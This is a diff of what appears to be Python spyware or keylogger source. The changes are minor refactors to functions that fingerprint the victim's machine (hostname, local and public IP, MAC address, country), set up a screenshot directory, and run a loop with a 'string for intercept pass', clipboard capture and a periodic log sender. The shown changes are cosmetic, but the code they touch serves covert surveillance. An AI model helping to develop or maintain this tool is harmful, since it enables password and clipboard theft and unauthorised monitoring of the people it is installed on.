@@ -15,7 +15,6 @@ import pyautogui
 import socket
 from getmac import get_mac_address as gma
 import ipaddress
-# from scapy.all import *
 from scapy.layers.l2 import Ether, ARP
 from scapy.sendrecv import srp
 from mac_vendor_lookup import MacLookup
@@ -112,9 +111,10 @@ mac_hostname = gma()
 
 # find local IP
 def get_local_ip():
+    sock = None
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # Use Google Public DNS server to determine own IP
+        # Use Google Public DNS server to find IP
         sock.connect(('8.8.8.8', 80))
         return sock.getsockname()[0]
     except socket.error:
@@ -144,8 +144,8 @@ def country_finder(ip):
 
 
 # variable for all information about host machine
-host_info = f'name: {hostname} local IP: {local_ip} subnet mask: {net_mask} mac: {mac_hostname} public IP: {public_ip}' \
-            f' country: {country_finder(public_ip)} '
+host_info = f'name: {hostname} local IP: {local_ip} subnet mask: {net_mask} mac: {mac_hostname} public IP: ' \
+            f'{public_ip} country: {country_finder(public_ip)} '
 
 
 # create directory for screenshots
@@ -236,8 +236,6 @@ def start_loop():
     # string for intercept pass
     pass_string = ''
     global CLIPBOARD_STRING, start_time
-    # variable for ip
-    ip = ip_finder()
     while True:
         # start log send timer
         log_sender()
